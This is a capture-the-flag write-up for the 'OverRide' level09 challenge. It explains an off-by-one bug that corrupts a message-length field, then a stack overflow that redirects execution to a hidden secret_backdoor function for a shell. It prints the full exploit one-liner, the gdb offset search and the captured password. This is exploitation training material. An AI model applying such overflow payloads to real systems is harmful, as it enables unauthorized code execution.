
When executing this program, we are prompted to enter a username and then a message

```
level09@OverRide:~$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: xavier
>: Welcome, xavier
>: Msg @Unix-Dude
>>: hola
>: Msg sent!
```

By observing the code, we can see a function called secret_backdoor that is not called. This function allows us to execute whatever we want using the system() function.

```c
long long secret_backdoor()
{
    char v0;  // [bp-0x88]

    fgets(&v0, 128, stdin);
    return system(&v0);
}
```

So, we can deduce that we will need to modify the execution flow by modifying the RIP register at a certain point.

We can see that the program uses a message struct which stores the username, the message, and the message size.

```c
struct	s_message
{
	char	message[140];
	char	username[40];
	int		len;
}   t_message;
```

We can also see that in the set_username function, during the loop which writes the user's name into the struct, instead of looping 40 times, we will loop 41 times due to the <= 40 condition.

```c
for (v2 = 0; v2 <= 40 && (&v1)[v2]; v2 += 1)
    {
        a0->username[v2] = (&v1)[v2];
    }
```

This will allow us to overflow the len attribute of our struct and write the first high bit of this latter.
This vulnerability will allow us to overflow in set_msg at the level of strncpy which will write to a0->len of the message that we will write using fgets into a0->message.

```c
fgets(&v1, 0x400, stdin);
strncpy(a0->message, &v1, a0->len);
```

This means that we know what our payload will look like.

```
(python -c 'print("a"*40 + "\xff" + "\n" + "a" * OFFSET + "secret_backdoor") + "\n" + "/bin/sh"'; cat) | ./level09
```


To find the offset, we use a pattern generator. https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
```
(gdb) run < <(python -c 'print("a"*40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag|6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4|Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9")')
```
```
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) x/s $rsp
0x7fffffffe5d8:  "6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4"
```

```diff
- 6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4
```
We can see that this string starts from 200 of the pattern.

offset = 200


Now let's find the address of secret_backdoor.
```
(gdb) print secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```
secret_backdoor = 0x55555555488c

(python -c 'print("a"*40 + "\xff" + "\n" + "a" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00") + "\n" + "/bin/sh"'; cat) | ./level09

```
level09@OverRide:~$ (python -c 'print("a"*40 + "\xff" + "\n" + "a" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00") + "\n" + "/bin/sh"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
